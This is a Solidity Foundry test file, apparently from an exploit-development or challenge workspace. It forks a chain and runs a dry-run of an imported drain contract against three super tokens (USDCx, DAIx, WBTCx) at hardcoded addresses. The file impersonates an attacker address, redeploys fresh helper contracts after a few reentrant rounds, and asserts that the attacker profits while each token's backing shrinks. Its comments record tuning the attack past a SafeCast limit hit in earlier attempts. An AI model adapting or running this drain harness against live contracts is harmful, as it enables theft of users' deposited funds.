// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5ERC20Drain} from "../exploit/Run.s.sol";

interface IERC20View44 {
    function balanceOf(address account) external view returns (uint256);
}

interface ISuperTokenView44 {
    function getUnderlyingToken() external view returns (address);
}

/// @notice Dry-run harness for the fresh-helper ERC20 continuation strategy.
///         The prior single-helper version reliably hit the same later-round
///         SafeCast ceiling seen on the native helper, so this attempt
///         redeploys a new helper after short bursts.
contract Attempt44MultiHelperERC20DrainTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address internal constant WBTCX = 0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;

    uint256 internal constant MAX_REENTRY_COUNT = 10;
    uint256 internal constant MAX_ROUNDS_PER_HELPER = 3;
    uint256 internal constant MAX_HELPERS_PER_TOKEN = 4;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_execute_multi_helper_drain_for_remaining_tokens() public {
        uint256 nativeBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        _drainToken("USDCx", USDCX, 520_000_000, 100 ether);
        _drainToken("DAIx", DAIX, 530_000_000, 100 ether);
        _drainToken("WBTCx", WBTCX, 540_000_000, 1_000 ether);
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "native balance should strictly increase");
    }

    function _drainToken(string memory label, address superToken, uint32 indexBase, uint256 bootstrapNative) internal {
        address underlying = ISuperTokenView44(superToken).getUnderlyingToken();
        uint256 nativeBeforeAll = ATTACKER.balance;
        uint256 initialBacking = IERC20View44(underlying).balanceOf(superToken);

        console.log(label);
        console.log("attacker native before token:", nativeBeforeAll);
        console.log("backing before:", initialBacking);
        console.log("bootstrap native:", bootstrapNative);

        uint256 backingBefore = initialBacking;
        uint256 totalRounds;
        uint256 helpersUsed;

        while (helpersUsed < MAX_HELPERS_PER_TOKEN && backingBefore > 1) {
            uint256 nativeBeforeHelper = ATTACKER.balance;
            Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
            console.log("helper:", helpersUsed + 1);
            console.log("helper address:", address(drain));

            (uint256 roundsExecuted, uint256 nativeOut) = drain.executeDrain{value: bootstrapNative}(
                MAX_ROUNDS_PER_HELPER, MAX_REENTRY_COUNT
            );

            uint256 nativeAfterHelper = ATTACKER.balance;
            uint256 backingAfter = IERC20View44(underlying).balanceOf(superToken);

            console.log("rounds executed:", roundsExecuted);
            console.log("helper native out:", nativeOut);
            console.log("helper native delta:", nativeAfterHelper - nativeBeforeHelper);
            console.log("backing after helper:", backingAfter);

            assertGt(roundsExecuted, 0, "no rounds executed");
            assertGt(nativeAfterHelper, nativeBeforeHelper, "helper not profitable");
            assertLt(backingAfter, backingBefore, "helper did not reduce backing");

            totalRounds += roundsExecuted;
            backingBefore = backingAfter;

            unchecked {
                ++helpersUsed;
            }
        }

        console.log("helpers used:", helpersUsed);
        console.log("total rounds:", totalRounds);
        console.log("native delta:", ATTACKER.balance - nativeBeforeAll);
        console.log("backing final:", backingBefore);

        assertGt(totalRounds, 0, "token did not execute any rounds");
        assertGt(ATTACKER.balance, nativeBeforeAll, "token was not profitable");
        assertLt(backingBefore, initialBacking, "token backing unchanged");
    }
}
